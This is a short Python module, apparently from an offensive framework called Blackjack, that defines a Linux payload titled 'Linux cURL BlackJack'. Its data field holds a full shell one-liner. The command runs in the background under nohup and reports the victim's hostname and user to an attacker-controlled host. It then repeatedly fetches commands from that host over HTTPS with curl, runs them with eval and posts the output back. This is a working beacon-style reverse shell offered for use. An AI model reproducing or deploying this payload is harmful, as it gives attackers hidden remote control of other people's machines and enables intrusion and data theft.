# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Linux cURL BlackJack',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Http based beacon-like reverse shell that utilizes cURL',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'blackjack',
        'type' : 'sh-curl-ssl',
        'os' : 'linux',
        'shell' : 'unix'
    }

    config = {
        'frequency' : 0.8
    }

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = 'nohup `s=*LHOST*&&i=*SESSIONID*&&hname=$(hostname)&&p=https://;curl -s -k "$p$s/*VERIFY*/$hname/$USER" -H "*BLACKJACKID*: $i" -o /dev/null 2>/dev/null;while :; do c=$(curl -s -k "$p$s/*GETCMD*" -H "*BLACKJACKID*: $i" 2>/dev/null);if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/*POSTRES* -X POST -H "*BLACKJACKID*: $i" -d "$r" 2>/dev/null; fi; fi; sleep *FREQ*; done;` &'
